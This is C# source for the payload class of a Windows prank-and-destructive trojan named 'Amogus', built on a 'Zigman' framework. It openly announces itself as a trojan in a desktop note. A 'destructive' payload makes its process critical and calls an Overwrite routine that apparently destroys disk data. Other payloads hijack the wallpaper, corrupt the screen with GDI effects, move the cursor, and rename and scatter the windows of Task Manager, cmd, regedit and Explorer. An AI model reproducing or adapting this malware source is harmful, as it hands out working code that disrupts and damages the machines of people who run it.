// Copyright © TheAirBlow 2022 <theairblow.help@gmail.com>
// This Source Code Form is subject to the terms of the Mozilla Public
// License, v2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using TheAirBlow.Zigman;
using TheAirBlow.Zigman.Attributes;

namespace TheAirBlow.Amogus;

public class AllPayloads : Payloads
{
    [Payload("destructive", SafetyLevel.Destructive, true)]
    [UseQueue(0, 0)]
    public void DestuctiveStuff()
    {
        MakeProcessCritical();
        Overwrite(Array.Empty<byte>());
    }

    [Payload("init", SafetyLevel.Safe, true)]
    [UseQueue(1, 24000)]
    public void InitializationStuff()
    {
        _monke = Image.FromFile(Path.Combine(Directory.GetCurrentDirectory(), "assets\\img_monke.png"));
        _amogus = Image.FromFile(Path.Combine(Directory.GetCurrentDirectory(), "assets\\img_amogus.png"));
        
        var path = Path.Combine(Directory.GetCurrentDirectory(), "assets\\music_amogus.wav");
        Program.Manager.PlayFile(path, true);
        SetWallpaper(Path.Combine(Directory.GetCurrentDirectory(),
            "assets\\img_wallpaper.jpg"), Style.Stretched);
        var note = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "note.txt");
        File.WriteAllText(note, "Haha you just ran Amogus trojan!!1!\r\nRest in piss, forever miss!\r\n\r\nCopyright (C) TheAirBlow 2021" +
                                "\r\nGitHub: https://github.com/theairblow/zigman" +
                                "\r\nVK: https://vk.com/theairblow");
        Process.Start(@"C:\Windows\System32\notepad.exe", note);
    }

    private Image _monke;
    private Image _amogus;

    [Payload("images", SafetyLevel.Safe)]
    [UseQueue(2, 10000)]
    public void AmongusMonkeDraw()
    {
        var x = Random.Next(0, Width);
        var y = Random.Next(0, Height);
        DisplayGraphics.DrawImage(
            Random.Next(0, 100) < 8 
                ? _monke : _amogus, x, y);
        Thread.Sleep(100);
    }
    
    [Payload("iconSpam", SafetyLevel.Safe)]
    [UseQueue(3, 10000)]
    public void IconsSpam()
    {
        var icon = LoadIcon(IntPtr.Zero, Random.Next(32512, 32518)); 
        DrawIcon(DisplayHandle, Random.Next(0, Width), Random.Next(0, Height), icon);
        Thread.Sleep(10);
    }
    
    [Payload("rngChunks", SafetyLevel.Safe)]
    [UseQueue(4, 10000)]
    public void RandomChunksMove()
    {
        var x1 = Random.Next(0, Width);
        var y1 = Random.Next(0, Height);
        var x2 = Random.Next(0, Width);
        var y2 = Random.Next(0, Height);
        var w = Random.Next(0, 300);
        var h = Random.Next(0, 300);
        var w2 = Random.Next(0, Width);
        var h2 = Random.Next(0, Height);
        StretchBlt(DisplayHandle, x1, y1, w, h, 
            DisplayHandle, x2, y2, w2, 
            h2, RasterOperation.SrcInvert);
        Thread.Sleep(100);
    }
    
    [Payload("squish", SafetyLevel.Safe)]
    [UseQueue(5, 10000)]
    public void Squish()
    {
        var original = CreateCompatibleDC(DisplayHandle);
        var bitmap = CreateCompatibleBitmap(
            DisplayHandle, Width, Height);
        var holdbit = SelectObject(original, bitmap);
        StretchBlt(original, 25, 25, Width - 50, Height - 50,
            DisplayHandle, 0, 0, Width, Height,
            RasterOperation.SrcCopy);
        StretchBlt(DisplayHandle, -25, -25, Width + 50, Height + 50,
            original, 0, 0, Width, Height, 
            RasterOperation.SrcCopy);
        SelectObject(original, holdbit);
        DeleteObject(bitmap);
        Thread.Sleep(100);
    }
    
    [Payload("cursorMove", SafetyLevel.Safe)]
    [UseQueue(6, 10000)]
    public void RandomCursorMove()
    {
        Cursor.Position = new System.Drawing.Point(Cursor.Position.X + Random.Next(-10, 10),
            Cursor.Position.Y + Random.Next(-10, 10));
        Thread.Sleep(20);
    }
    
    [Payload("sucker", SafetyLevel.Safe)]
    [UseQueue(7, 10000)]
    public void DeezSucker()
    {
        var original = CreateCompatibleDC(DisplayHandle);
        var bitmap = CreateCompatibleBitmap(
            DisplayHandle, Width, Height);
        var holdbit = SelectObject(original, bitmap);
        StretchBlt(original, 0, 0, Width, Height,
            DisplayHandle, 0, 0, Width, Height, 
            RasterOperation.SrcCopy);
                
        var x = Random.Next(0, Width);
        var y = Random.Next(0, Height);
        for (var i = 1020; i != 0; i -= 20) {
            var l = i - 20;
            StretchBlt(DisplayHandle, x - l / 2, y - l / 2,
                l, l, original,
                x - i / 2, y - i / 2, i, i,
                RasterOperation.SrcCopy);
        }
                
        SelectObject(original, holdbit);
        DeleteObject(bitmap);
        Thread.Sleep(100);
    }
    
    [Payload("mirroring", SafetyLevel.Safe)]
    [UseQueue(8, 10000)]
    public void ScreenMirroring()
    {
        StretchBlt(
            DisplayHandle, 0, 0, 
            Width, Height, 
            DisplayHandle, Width, 0,
            -Width, Height,
            RasterOperation.SrcCopy);
        Thread.Sleep(250);
    }
    
    [Payload("rngInvert", SafetyLevel.Safe)]
    [UseQueue(9, 10000)]
    public void InvertRandomChunks()
    {
        var x = Random.Next(0, Width);
        var y = Random.Next(0, Height);
        var wh = Random.Next(0, 300);
        StretchBlt(DisplayHandle, x, y, wh, wh, DisplayHandle, x, y, wh, 
            wh, RasterOperation.DstInvert);
        Thread.Sleep(100);
    }
    
    [Payload("invert", SafetyLevel.Safe)]
    [UseQueue(10, 10000)]
    public void invertScreen()
    {
        StretchBlt(DisplayHandle, 0, 0, Width, Height, 
            DisplayHandle, 0, 0, Width, Height, RasterOperation.DstInvert);
        Thread.Sleep(250);
    }
    
    [Payload("tunneling", SafetyLevel.Safe)]
    [UseQueue(11, 10000)]
    public void TunnelingEffect()
    {
        var w = Width - 100;
        var h = Height - 100;
        StretchBlt(DisplayHandle, 50, 50, w, h, DisplayHandle, 
            0, 0, Width, Height, RasterOperation.SrcCopy);
        Thread.Sleep(100);
    }
    
    [Payload("screenRotate", SafetyLevel.Safe)]
    [UseQueue(12, 10000)]
    public void ScreenRotation()
    {
        var points = new POINT[3];
        points[0].X = -10;
        points[0].Y = -10;
        points[1].X = Width + 10;
        points[1].Y = 0;
        points[2].X = -10;
        points[2].Y = Height + 10;
        PlgBlt(DisplayHandle, points, DisplayHandle, 0, 0,
            Width, Height, IntPtr.Zero, 0, 0);
        Thread.Sleep(100);
    }
    
    [Payload("beeps", SafetyLevel.Safe)]
    [UseQueue(13, 10000)]
    public void RandomBeeps()
        => Beep(Random.Next(500, 1500), 100);

    [Payload("redify", SafetyLevel.Safe)]
    [UseQueue(14, 10000)]
    public void HellishScreen()
    {
        var dest = CreateCompatibleDC(DisplayHandle);
        var bitmap = CreateCompatibleBitmap(
            DisplayHandle, Width, Height);
        var holdbit = SelectObject(dest, bitmap);
        SelectObject(dest, CreateSolidBrush(100));
        Rectangle(dest, 0, 0,
            Width, Height);
        AlphaBlend(DisplayHandle, 0, 0,
            Width, Height, dest,
            0, 0, Width, Height,
            new BLENDFUNCTION(0, 0, 10, 0));
        SelectObject(dest, holdbit);
        DeleteObject(bitmap);
        Thread.Sleep(100);
    }

    [Payload("screenSmelter", SafetyLevel.Safe)]
    [UseQueue(15, 10000)]
    public void GoodOlSmelter()
    {
        var x = Random.Next(0, Width);
        var y = Random.Next(15, 50);
        var size = Random.Next(2, 100);
        StretchBlt(DisplayHandle, x, y, 
            size, Height, DisplayHandle, x,
            0, size, Height,
            RasterOperation.SrcCopy);
        Thread.Sleep(50);
    }
    
    private int currentRotationPayload = 1;
    private int rotationIndex1 = 1;
    private int lastRotationIndex1 = 0;
    private int rotationIndex2 = 0;

    /// <summary>
    /// Rotation values (big boi)
    /// </summary>
    private List<Rectangle> rotationValues = new() {
        //------------------------\\
        new(0, 0, Width, Height),
        new(0, 5, Width, Height),
        new(0, 10, Width, Height),
        new(0, 15, Width, Height),
        new(0, 20, Width, Height),
        new(0, 25, Width, Height),
        new(0, 30, Width, Height),
        new(0, 35, Width, Height),
        new(0, 40, Width, Height),
        new(0, 45, Width, Height),
        new(0, 50, Width, Height),
        new(0, 55, Width, Height),
        new(0, 60, Width, Height),
        //-------------------------\\
        new(5, 60, Width, Height),
        new(10, 60, Width, Height),
        new(15, 60, Width, Height),
        new(20, 60, Width, Height),
        new(25, 60, Width, Height),
        new(30, 60, Width, Height),
        new(35, 60, Width, Height),
        new(40, 60, Width, Height),
        //--------------------------\\
        new(40, 55, Width, Height),
        new(40, 50, Width, Height),
        new(40, 45, Width, Height),
        new(40, 40, Width, Height),
        new(40, 35, Width, Height),
        new(40, 30, Width, Height),
        new(40, 25, Width, Height),
        new(40, 20, Width, Height),
        new(40, 15, Width, Height),
        new(40, 10, Width, Height),
        new(40, 5, Width, Height),
        //-------------------------\\
        new(40, 0, Width, Height),
        new(35, 0, Width, Height),
        new(30, 0, Width, Height),
        new(25, 0, Width, Height),
        new(20, 0, Width, Height),
        new(15, 0, Width, Height),
        new(10, 0, Width, Height),
        new(5, 0, Width, Height),
        new(0, 0, Width, Height),
    };
    
    [Payload("rotation1", SafetyLevel.Safe)]
    [UseQueue(16, 10000)]
    public void RotationOne()
    {
        if (currentRotationPayload != 1) Thread.Sleep(1000);
        if (rotationIndex1 == rotationValues.Count - 1)
            rotationIndex1 = 0;
        var lastRotation = rotationValues[lastRotationIndex1];
        var newRotation = rotationValues[rotationIndex1];
        StretchBlt(DisplayHandle, newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);

        rotationIndex1++;
        Thread.Sleep(100);
    }
    
    [Payload("rotate2", SafetyLevel.Safe)]
    [UseQueue(17, 10000)]
    public void RotationTwo()
    {
        if (currentRotationPayload == 1) currentRotationPayload = 2;
        if (currentRotationPayload != 2) Thread.Sleep(1000);
        if (rotationIndex2 == rotationValues.Count - 1)
            rotationIndex2 = 0;
        var lastRotation = new Rectangle(0, 0, Width, Height);
        var newRotation = rotationValues[rotationIndex2];
        StretchBlt(DisplayHandle, newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);

        StretchBlt(DisplayHandle, -newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, -lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);
                
        StretchBlt(DisplayHandle, newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, lastRotation.X, -lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);
                
        StretchBlt(DisplayHandle, -newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, -lastRotation.X, -lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);
                
        rotationIndex2++;
        Thread.Sleep(100);
    }

    private bool initialized;
    private int current;
    
    [Payload("christmas", SafetyLevel.Safe)]
    [UseQueue(18, 10000)]
    public void Christmas()
    {
        if (!initialized) {
            MagInitialize();
            initialized = true;
        }
                    
        var matrix = new ColorEffect {
            transform = new float[] {
                1, 0, 0, 0, 0,
                0, 1, 0, 0, 0,
                0, 0, 1, 0, 0,
                0, 0, 0, 1, 0,
                0, 0, 0, 0, 0
            }
        };

        matrix.transform[19 + current] = 0.4f;
        MagSetFullscreenColorEffect(ref matrix);
        current++;
        if (current == 4) current = 1;
        Thread.Sleep(500);
    }
    
    [Payload("windowsFucker", SafetyLevel.SemiDestructive)]
    [UseQueue(19, 10000)]
    public void WindowsFucker()
    {
        var processes = new List<string> {
            "explorer", "notepad",
            "wordpad", "cmd", "regedit", "taskmgr", "mspaint",
            "powershell", "calc", "control", "mmc", "winver"
        };
        foreach (var hWnd in from name in processes from proc 
                     in Process.GetProcessesByName(name) select proc.MainWindowHandle) {
            EnumChildWindows(hWnd, (hwnd, _) => {
                SetWindowTextA(hwnd, "AMOGUS (VERY SUS)");
                SetWindowPos(hwnd, (IntPtr)0, Random.Next(0, 80), 
                    Random.Next(0, 80), 0, 0, (uint)SetWindowPosFlags.DoNotResize);
                return true;
            },  (IntPtr)null);
            SetWindowTextA(hWnd, "AMOGUS (VERY SUS)");
            SetWindowPos(hWnd, (IntPtr)ZOrder.Top, Random.Next(0, Width), 
                Random.Next(0, Height), 0, 0, (uint)SetWindowPosFlags.DoNotResize);
        }
                    
        Thread.Sleep(500);
    }
    
    [Payload("eternalDarkness", SafetyLevel.Safe)]
    [UseQueue(20, 60000)]
    public void EternalDarkness()
    {
        StretchBlt(DisplayHandle, Random.Next(-5, 5), Random.Next(-5, 5), Width, Height,
            DisplayHandle, 0, 0, Width, Height, 8658951);
        Thread.Sleep(100);
    }
    
    [Payload("stop", SafetyLevel.Safe, true)]
    [UseQueue(21, 0)]
    public void StopThisHell()
        => StopAllThreads();
}